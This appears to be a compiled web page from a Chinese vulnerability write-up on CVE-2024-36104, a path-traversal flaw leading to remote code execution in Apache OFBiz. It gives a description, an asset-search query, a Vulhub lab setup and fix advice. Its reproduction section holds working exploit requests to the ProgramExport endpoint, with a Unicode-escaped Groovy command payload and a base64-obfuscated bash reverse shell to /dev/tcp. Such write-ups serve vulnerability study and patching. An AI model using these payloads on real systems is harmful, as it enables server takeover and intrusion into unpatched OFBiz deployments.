import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as p,o as e,c as o,a as n,b as a,d as u,e as c}from"./app-58e4a7d6.js";const i={},l=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),r=n("p",null,"Apache OFBiz 是一个电子商务平台，用于构建大中型企业级、跨平台、跨数据库、跨应用服务器的多层、分布式电子商务类应用系统。",-1),d=n("p",null,[a("Apache OFBiz 版本 18.12.14 之前版本中存在路径遍历漏洞，由于对 HTTP 请求 URL 中的特殊字符（如 "),n("code",null,"；、%2e"),a("）限制不当，攻击者可构造恶意请求绕过验证并利用相关接口功能导致远程代码执行。")],-1),k=n("p",null,"参考链接：",-1),h={href:"https://ofbiz.apache.org/security.html",target:"_blank",rel:"noopener noreferrer"},m={href:"https://issues.apache.org/jira/browse/OFBIZ-13092",target:"_blank",rel:"noopener noreferrer"},v={href:"https://github.com/apache/ofbiz-framework/commit/d33ce31012",target:"_blank",rel:"noopener noreferrer"},b=c(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Apache OFBiz &lt; 18.12.14
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;Apache_OFBiz&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 启动一个 18.12.09 版本 Apache OFBiz。</p><p>docker-compose.yml：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>version: &#39;2&#39;
services:
 web:
   image: vulhub/ofbiz:18.12.09
   ports:
    - &quot;8443:8443&quot;
    - &quot;5005:5005&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在等待数分钟后，访问 <code>https://your-ip:8443/accounting</code> 查看到登录页面，说明环境已启动成功。</p><p>如果是非本地 localhost 启动，Headers 需要包含 <code>Host: localhost</code>，否则报错：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ERROR MESSAGE
org.apache.ofbiz.webapp.control.RequestHandlerException: Domain xx.xx.xx.xx not accepted to prevent host header injection. You need to set host-headers-allowed property in security.properties file.
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240612165100299.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>Unicode 编码：</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment"># CVE-2024-36104 Payload</span>
throw new Exception<span class="token punctuation">(</span><span class="token string">&#39;id&#39;</span>.execute<span class="token punctuation">(</span><span class="token punctuation">)</span>.text<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment"># Escape Unicode Characters</span>
<span class="token punctuation">\\</span>u0074<span class="token punctuation">\\</span>u0068<span class="token punctuation">\\</span>u0072<span class="token punctuation">\\</span>u006F<span class="token punctuation">\\</span>u0077<span class="token punctuation">\\</span>u0020<span class="token punctuation">\\</span>u006E<span class="token punctuation">\\</span>u0065<span class="token punctuation">\\</span>u0077<span class="token punctuation">\\</span>u0020<span class="token punctuation">\\</span>u0045<span class="token punctuation">\\</span>u0078<span class="token punctuation">\\</span>u0063<span class="token punctuation">\\</span>u0065<span class="token punctuation">\\</span>u0070<span class="token punctuation">\\</span>u0074<span class="token punctuation">\\</span>u0069<span class="token punctuation">\\</span>u006F<span class="token punctuation">\\</span>u006E<span class="token punctuation">\\</span>u0028<span class="token punctuation">\\</span>u0027<span class="token punctuation">\\</span>u0069<span class="token punctuation">\\</span>u0064<span class="token punctuation">\\</span>u0027<span class="token punctuation">\\</span>u002E<span class="token punctuation">\\</span>u0065<span class="token punctuation">\\</span>u0078<span class="token punctuation">\\</span>u0065<span class="token punctuation">\\</span>u0063<span class="token punctuation">\\</span>u0075<span class="token punctuation">\\</span>u0074<span class="token punctuation">\\</span>u0065<span class="token punctuation">\\</span>u0028<span class="token punctuation">\\</span>u0029<span class="token punctuation">\\</span>u002E<span class="token punctuation">\\</span>u0074<span class="token punctuation">\\</span>u0065<span class="token punctuation">\\</span>u0078<span class="token punctuation">\\</span>u0074<span class="token punctuation">\\</span>u0029<span class="token punctuation">\\</span>u003B
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240612164521377.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>poc：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /webtools/control/forgotPassword/ProgramExport HTTP/1.1
Host: localhost:8443
Content-Length: 342
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: */*

groovyProgram=\\u0074\\u0068\\u0072\\u006F\\u0077\\u0020\\u006E\\u0065\\u0077\\u0020\\u0045\\u0078\\u0063\\u0065\\u0070\\u0074\\u0069\\u006F\\u006E\\u0028\\u0027\\u0069\\u0064\\u0027\\u002E\\u0065\\u0078\\u0065\\u0063\\u0075\\u0074\\u0065\\u0028\\u0029\\u002E\\u0074\\u0065\\u0078\\u0074\\u0029\\u003B
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240612165410448.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>反弹 shell：</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>/bin/bash <span class="token parameter variable">-i</span> <span class="token operator">&gt;&amp;</span> /dev/tcp/127.0.0.1/8888 <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>

<span class="token comment"># java.lang.Runtime.exec() Payload</span>
<span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token punctuation">{</span>echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE<span class="token operator">=</span><span class="token punctuation">}</span><span class="token operator">|</span><span class="token punctuation">{</span>base64,-d<span class="token punctuation">}</span><span class="token operator">|</span><span class="token punctuation">{</span>bash,-i<span class="token punctuation">}</span>

<span class="token comment"># CVE-2024-36104 Payload</span>
throw new Exception<span class="token punctuation">(</span><span class="token string">&#39;bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}&#39;</span>.execute<span class="token punctuation">(</span><span class="token punctuation">)</span>.text<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment"># Escape Unicode Characters</span>
<span class="token punctuation">\\</span>u0074<span class="token punctuation">\\</span>u0068<span class="token punctuation">\\</span>u0072<span class="token punctuation">\\</span>u006F<span class="token punctuation">\\</span>u0077<span class="token punctuation">\\</span>u0020<span class="token punctuation">\\</span>u006E<span class="token punctuation">\\</span>u0065<span class="token punctuation">\\</span>u0077<span class="token punctuation">\\</span>u0020<span class="token punctuation">\\</span>u0045<span class="token punctuation">\\</span>u0078<span class="token punctuation">\\</span>u0063<span class="token punctuation">\\</span>u0065<span class="token punctuation">\\</span>u0070<span class="token punctuation">\\</span>u0074<span class="token punctuation">\\</span>u0069<span class="token punctuation">\\</span>u006F<span class="token punctuation">\\</span>u006E<span class="token punctuation">\\</span>u0028<span class="token punctuation">\\</span>u0027<span class="token punctuation">\\</span>u0062<span class="token punctuation">\\</span>u0061<span class="token punctuation">\\</span>u0073<span class="token punctuation">\\</span>u0068<span class="token punctuation">\\</span>u0020<span class="token punctuation">\\</span>u002D<span class="token punctuation">\\</span>u0063<span class="token punctuation">\\</span>u0020<span class="token punctuation">\\</span>u007B<span class="token punctuation">\\</span>u0065<span class="token punctuation">\\</span>u0063<span class="token punctuation">\\</span>u0068<span class="token punctuation">\\</span>u006F<span class="token punctuation">\\</span>u002C<span class="token punctuation">\\</span>u004C<span class="token punctuation">\\</span>u0032<span class="token punctuation">\\</span>u004A<span class="token punctuation">\\</span>u0070<span class="token punctuation">\\</span>u0062<span class="token punctuation">\\</span>u0069<span class="token punctuation">\\</span>u0039<span class="token punctuation">\\</span>u0069<span class="token punctuation">\\</span>u0059<span class="token punctuation">\\</span>u0058<span class="token punctuation">\\</span>u004E<span class="token punctuation">\\</span>u006F<span class="token punctuation">\\</span>u0049<span class="token punctuation">\\</span>u0043<span class="token punctuation">\\</span>u0031<span class="token punctuation">\\</span>u0070<span class="token punctuation">\\</span>u0049<span class="token punctuation">\\</span>u0044<span class="token punctuation">\\</span>u0034<span class="token punctuation">\\</span>u006D<span class="token punctuation">\\</span>u0049<span class="token punctuation">\\</span>u0043<span class="token punctuation">\\</span>u0039<span class="token punctuation">\\</span>u006B<span class="token punctuation">\\</span>u005A<span class="token punctuation">\\</span>u0058<span class="token punctuation">\\</span>u0059<span class="token punctuation">\\</span>u0076<span class="token punctuation">\\</span>u0064<span class="token punctuation">\\</span>u0047<span class="token punctuation">\\</span>u004E<span class="token punctuation">\\</span>u0077<span class="token punctuation">\\</span>u004C<span class="token punctuation">\\</span>u007A<span class="token punctuation">\\</span>u0045<span class="token punctuation">\\</span>u0079<span class="token punctuation">\\</span>u004E<span class="token punctuation">\\</span>u0079<span class="token punctuation">\\</span>u0034<span class="token punctuation">\\</span>u0077<span class="token punctuation">\\</span>u004C<span class="token punctuation">\\</span>u006A<span class="token punctuation">\\</span>u0041<span class="token punctuation">\\</span>u0075<span class="token punctuation">\\</span>u004D<span class="token punctuation">\\</span>u0053<span class="token punctuation">\\</span>u0038<span class="token punctuation">\\</span>u0034<span class="token punctuation">\\</span>u004F<span class="token punctuation">\\</span>u0044<span class="token punctuation">\\</span>u0067<span class="token punctuation">\\</span>u0034<span class="token punctuation">\\</span>u0049<span class="token punctuation">\\</span>u0044<span class="token punctuation">\\</span>u0041<span class="token punctuation">\\</span>u002B<span class="token punctuation">\\</span>u004A<span class="token punctuation">\\</span>u006A<span class="token punctuation">\\</span>u0045<span class="token punctuation">\\</span>u003D<span class="token punctuation">\\</span>u007D<span class="token punctuation">\\</span>u007C<span class="token punctuation">\\</span>u007B<span class="token punctuation">\\</span>u0062<span class="token punctuation">\\</span>u0061<span class="token punctuation">\\</span>u0073<span class="token punctuation">\\</span>u0065<span class="token punctuation">\\</span>u0036<span class="token punctuation">\\</span>u0034<span class="token punctuation">\\</span>u002C<span class="token punctuation">\\</span>u002D<span class="token punctuation">\\</span>u0064<span class="token punctuation">\\</span>u007D<span class="token punctuation">\\</span>u007C<span class="token punctuation">\\</span>u007B<span class="token punctuation">\\</span>u0062<span class="token punctuation">\\</span>u0061<span class="token punctuation">\\</span>u0073<span class="token punctuation">\\</span>u0068<span class="token punctuation">\\</span>u002C<span class="token punctuation">\\</span>u002D<span class="token punctuation">\\</span>u0069<span class="token punctuation">\\</span>u007D<span class="token punctuation">\\</span>u0027<span class="token punctuation">\\</span>u002E<span class="token punctuation">\\</span>u0065<span class="token punctuation">\\</span>u0078<span class="token punctuation">\\</span>u0065<span class="token punctuation">\\</span>u0063<span class="token punctuation">\\</span>u0075<span class="token punctuation">\\</span>u0074<span class="token punctuation">\\</span>u0065<span class="token punctuation">\\</span>u0028<span class="token punctuation">\\</span>u0029<span class="token punctuation">\\</span>u002E<span class="token punctuation">\\</span>u0074<span class="token punctuation">\\</span>u0065<span class="token punctuation">\\</span>u0078<span class="token punctuation">\\</span>u0074<span class="token punctuation">\\</span>u0029<span class="token punctuation">\\</span>u003B
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /webtools/control/forgotPassword/ProgramExport HTTP/1.1
Host: localhost:8443
Content-Length: 342
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: */*

groovyProgram=\\u0074\\u0068\\u0072\\u006F\\u0077\\u0020\\u006E\\u0065\\u0077\\u0020\\u0045\\u0078\\u0063\\u0065\\u0070\\u0074\\u0069\\u006F\\u006E\\u0028\\u0027\\u0062\\u0061\\u0073\\u0068\\u0020\\u002D\\u0063\\u0020\\u007B\\u0065\\u0063\\u0068\\u006F\\u002C\\u004C\\u0032\\u004A\\u0070\\u0062\\u0069\\u0039\\u0069\\u0059\\u0058\\u004E\\u006F\\u0049\\u0043\\u0031\\u0070\\u0049\\u0044\\u0034\\u006D\\u0049\\u0043\\u0039\\u006B\\u005A\\u0058\\u0059\\u0076\\u0064\\u0047\\u004E\\u0077\\u004C\\u007A\\u0045\\u0079\\u004E\\u0079\\u0034\\u0077\\u004C\\u006A\\u0041\\u0075\\u004D\\u0053\\u0038\\u0034\\u004F\\u0044\\u0067\\u0034\\u0049\\u0044\\u0041\\u002B\\u004A\\u006A\\u0045\\u003D\\u007D\\u007C\\u007B\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034\\u002C\\u002D\\u0064\\u007D\\u007C\\u007B\\u0062\\u0061\\u0073\\u0068\\u002C\\u002D\\u0069\\u007D\\u0027\\u002E\\u0065\\u0078\\u0065\\u0063\\u0075\\u0074\\u0065\\u0028\\u0029\\u002E\\u0074\\u0065\\u0078\\u0074\\u0029\\u003B
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240612165908282.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞修复" tabindex="-1"><a class="header-anchor" href="#漏洞修复" aria-hidden="true">#</a> 漏洞修复</h2><p>目前该漏洞已经修复，受影响用户可升级到 Apache OFBiz 18.12.14 或更高版本。下载链接：</p>`,25),g={href:"https://ofbiz.apache.org/download.html",target:"_blank",rel:"noopener noreferrer"};function x(f,_){const s=p("ExternalLinkIcon");return e(),o("div",null,[l,r,d,k,n("ul",null,[n("li",null,[n("a",h,[a("https://ofbiz.apache.org/security.html"),u(s)])]),n("li",null,[n("a",m,[a("https://issues.apache.org/jira/browse/OFBIZ-13092"),u(s)])]),n("li",null,[n("a",v,[a("https://github.com/apache/ofbiz-framework/commit/d33ce31012"),u(s)])])]),b,n("ul",null,[n("li",null,[n("a",g,[a("https://ofbiz.apache.org/download.html"),u(s)])])])])}const C=t(i,[["render",x],["__file","Apache OFBiz 目录遍历致代码执行漏洞 CVE-2024-36104.html.vue"]]);export{C as default};
